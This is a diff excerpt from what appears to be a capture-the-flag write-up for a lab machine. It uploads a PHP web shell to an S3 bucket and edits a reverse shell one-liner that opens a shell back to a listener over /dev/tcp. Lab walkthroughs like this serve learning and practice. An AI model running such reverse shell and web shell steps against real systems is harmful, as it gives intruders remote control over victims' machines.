@@ -13,7 +13,7 @@ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 ````
 5. Use `ifconfig` to determine our IP address and create the reverse shell command using https://www.revshells.com:
 ````bash
-echo 'sh -i >& /dev/tcp/10.10.15.142/443 0>&1' > shell.sh
+echo 'bash -c "bash -i >& /dev/tcp/10.10.15.142/443 0>&1"' > shell.sh
 ```` 
 6. Open a server on our machine to connect to the reverse shell:
 ````bash
